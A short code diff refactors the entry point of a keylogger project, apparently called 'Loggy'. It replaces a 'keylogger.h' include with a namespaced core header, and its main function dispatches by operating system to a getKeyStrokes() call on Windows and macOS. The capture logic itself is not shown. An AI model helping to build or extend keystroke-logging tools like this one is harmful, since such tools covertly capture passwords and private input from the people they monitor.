@@ -1,9 +1,7 @@
-#include <stdio.h>
-#include "include/types.h"
-#include "include/keylogger.h"
+#include "include/core.h"
 
 #ifdef _WIN32
-OPERATING_SYSTEM operatingSystem = WINDOWS;
+Loggy::Types::OPERATING_SYSTEM operatingSystem = Loggy::Types::OPERATING_SYSTEM::WINDOWS;
 #endif
 
 #ifdef linux
@@ -16,15 +14,15 @@ OPERATING_SYSTEM operatingSystem = MAC;
 
 int main() {
     switch (operatingSystem) {
-        case WINDOWS:
+        case Loggy::Types::OPERATING_SYSTEM::WINDOWS:
             printf("Operating System: Windows\n");
             getKeyStrokes();
             return 1;
-        case MAC:
+        case Loggy::Types::OPERATING_SYSTEM::MAC:
             printf("Operating System: MacOS\n");
             getKeyStrokes();
             break;
-        case LINUX:
+        case Loggy::Types::OPERATING_SYSTEM::LINUX:
             printf("Operating System: Linux Not Implemented\n");
             return 1;
         default:
